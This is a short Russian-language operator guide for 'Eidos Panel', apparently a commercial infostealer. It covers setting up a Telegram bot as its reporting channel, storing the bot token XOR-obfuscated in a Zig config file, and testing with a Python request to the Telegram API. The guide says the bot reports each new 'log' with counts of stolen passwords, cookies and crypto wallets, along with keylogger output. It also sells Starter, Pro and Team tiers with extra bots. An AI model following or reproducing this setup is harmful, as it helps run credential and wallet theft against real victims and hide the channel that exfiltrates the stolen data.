# Telegram Bot Setup for Eidos

## 1. Создать бота

1. Открыть Telegram, найти `@BotFather`
2. Отправить `/newbot`
3. Ввести имя: `Eidos Panel` (или любое)
4. Ввести username: `EidosPanelBot` (должен заканчиваться на `bot`)
5. Получить **токен** вида: `1234567890:AAE4WzOxmeRtV5rffDx1I-dsK5Irn5G3VE`

## 2. Получить Chat ID

1. Написать боту любое сообщение (например `/start`)
2. Открыть в браузере:
```
https://api.telegram.org/bot<TOKEN>/getUpdates
```
3. Найти `"chat":{"id":-1001234567890}` — это ваш Chat ID

## 3. Настроить в конфиге

В `src/config/config.zig`:
```zig
pub const ENABLE_TELEGRAM_BACKUP: bool = true;
pub const TELEGRAM_BOT_TOKEN: [46]u8 = .{ 0x00, ... }; // XOR-encrypted token
pub const TELEGRAM_CHAT_ID: [18]u8 = .{ 0x00, ... };   // XOR-encrypted chat ID
```

## 4. Проверить

```python
import requests
token = "1234567890:AAE4WzOxmeRtV5rffDx1I-dsK5Irn5G3VE"
chat_id = "-1001234567890"
r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
    json={"chat_id": chat_id, "text": "Eidos Panel: test"})
print(r.json())
```

## 5. Настройка уведомлений

Бот может отправлять:
- Уведомление о новом логе (количество паролей, кук, кошельков)
- Ошибки и критичные события
- Статус каждые N часов
- Логи кейлоггера

## 6. Несколько ботов (Pro/Team)

Для разных тарифов:
- Starter: 1 бот
- Pro: до 7 ботов
- Team: до 15 ботов

Каждый бот шлёт уведомления на разные каналы.
